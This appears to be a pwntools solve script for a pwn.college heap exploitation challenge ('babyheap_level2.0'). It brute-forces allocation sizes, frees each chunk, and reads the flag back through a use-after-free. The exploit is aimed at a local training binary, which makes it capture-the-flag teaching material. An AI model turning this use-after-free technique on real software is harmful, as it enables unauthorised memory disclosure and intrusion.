from pwn import *

counter = 0

while(counter < 1048):
    with process("./babyheap_level2.0") as p:
        print(p.clean())

        print("[!] Trying {}".format(counter))

        p.sendline(b"malloc")
        print(p.clean())

        p.sendline(str(counter).encode())
        print(p.clean())

        p.sendline(b"free")
        print(p.clean())

        p.sendline(b"read_flag")
        print(p.clean())

        p.sendline(b"puts")
        print(p.clean())

        res = p.clean()
        if b"pwn.college" in res:
            print("[+] Bin Size :: {}".format(counter))
            print("[+] Flag Found :: {}".format(res))
            break

        counter += 16
